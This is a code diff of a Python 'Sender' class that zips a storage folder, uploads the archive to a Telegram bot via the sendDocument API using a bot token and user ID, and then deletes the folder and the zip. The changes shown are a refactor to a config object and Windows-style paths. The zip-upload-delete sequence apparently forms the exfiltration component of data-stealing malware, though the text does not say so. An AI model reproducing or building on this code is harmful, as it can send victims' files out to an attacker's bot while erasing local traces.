@@ -2,21 +2,25 @@ from os import remove
 from requests import post
 from shutil import make_archive, rmtree
 
+from ..utils.config import SenderConfig
+
 
 class Sender:
 
     def __init__(self, *args):
 
-        for index, variable in enumerate(["zip_name", "storage_path", "storage_folder", "token", "user_id", "errors"]):
+        self.config = SenderConfig()
+
+        for index, variable in enumerate(self.config.Variables):
             self.__dict__.update({variable: args[index]})
 
     def __create_archive(self):
 
-        make_archive(f"{self.storage_path}{self.zip_name}", "zip", f"{self.storage_path}{self.storage_folder}")
+        make_archive(rf"{self.storage_path}\{self.zip_name}", "zip", rf"{self.storage_path}\{self.storage_folder}")
 
     def __send_archive(self):
 
-        with open(f"{self.storage_path}{self.zip_name}.zip", "rb") as file:
+        with open(rf"{self.storage_path}\{self.zip_name}.zip", "rb") as file:
 
             post(
                 url=f"https://api.telegram.org/bot{self.token}/sendDocument",
@@ -32,8 +36,8 @@ class Sender:
 
     def __delete_files(self):
 
-        rmtree(f"{self.storage_path}{self.storage_folder}")
-        remove(f"{self.storage_path}{self.zip_name}.zip")
+        rmtree(rf"{self.storage_path}\{self.storage_folder}")
+        remove(rf"{self.storage_path}\{self.zip_name}.zip")
 
     def run(self):
 
